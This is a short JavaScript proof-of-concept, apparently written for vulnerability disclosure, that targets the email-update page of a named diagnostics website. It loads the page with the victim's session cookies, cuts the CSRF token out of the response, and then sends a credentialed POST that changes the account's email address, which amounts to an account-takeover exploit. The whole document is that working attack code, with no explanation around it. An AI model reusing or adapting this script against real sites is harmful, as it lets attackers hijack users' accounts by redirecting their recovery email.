var fetchHash = new XMLHttpRequest();

var url = "https://usdiagnostics.roche.com/my-lab-update-email.html";
var datax;
var csrf_token='initial';
fetchHash.onreadystatechange=function ()
{
if(fetchHash.readyState==4 && fetchHash.status==200)
        {

            datax = fetchHash.responseText;
                       alert(datax);
                    csrf_token = datax.substring(285,321);
                         alert(csrf_token);

                         var HackAccount = new XMLHttpRequest();
                         url= "https://usdiagnostics.roche.com/my-lab-update-email.html";
                         HackAccount .open("POST",url, true);
                         HackAccount .withCredentials=true;
                         var data= 'csrfToken='+csrf_token+'&proceedWithNonwhitelist=true&newEmail=vulnerability.management@roche.com&newEmail2=vulnerability.management@roche.com' ;
                         HackAccount .setRequestHeader('X-Requested-With','XMLHttpRequest');
                         HackAccount .setRequestHeader('Content-Type','application/x-www-form-urlencoded');
                         HackAccount .send(data);

                         }

}

fetchHash.open("GET",url, true);
fetchHash.withCredentials=true;
fetchHash.send();
